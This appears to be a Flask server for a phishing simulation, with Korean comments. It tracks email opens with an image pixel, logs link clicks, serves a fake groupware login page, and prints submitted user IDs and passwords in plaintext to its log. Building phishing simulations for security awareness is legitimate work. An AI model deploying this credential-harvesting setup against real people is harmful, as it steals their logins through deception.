import datetime
from flask import Flask, request, send_file, render_template
from flask import Blueprint, send_from_directory

routesBp = Blueprint('routes', __name__)

# @routesBp.route('/.well-known/acme-challenge/<path:filename>')
# def serve_acme_challenge(filename):
#     return send_from_directory('static/.well-known/acme-challenge', filename)

app = Flask(__name__)
app.register_blueprint(routesBp)

@app.route('/')
def index():
    return 'Phishing Simulation Server is running.'

# 메일 열람 시 테스트용 이미지지
@app.route('/Mail_open')
def mail_tracker():
    user_id = request.args.get("user_id")
    now = datetime.datetime.now()
    print(f"[{now}] [Mail_OPEN] TRACKED - user_id : {user_id}")

    # 실제 PNG 이미지로 응답
    return send_file("tracker.png", mimetype="image/png")

# 피싱 사이트 클릭 시
@app.route('/Site_open')
def site_open():
    user_id = request.args.get("user_id")
    now = datetime.datetime.now()
    print(f"[{now}] [Site_OPEN] TRACKED - user_id : {user_id}")

    return render_template('login_page.html', user_id = user_id)

# 피싱 사이트 정보 입력 후 파일 다운로드 창
@app.route('/Login_Finish', methods=['POST'])
def site_login():
    user_id = request.form.get("user_id")
    groupware_id = request.form.get('groupware_id')
    groupware_pw = request.form.get('groupware_pw')
    now = datetime.datetime.now()
    print(f"[{now}] [Site_Login] TRACKED - user_id : {user_id} groupware_id : {groupware_id} groupware_pw : {groupware_pw}")

    return render_template('download_page.html', user_id = user_id,
    groupware_id = groupware_id, groupware_pw = groupware_pw)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)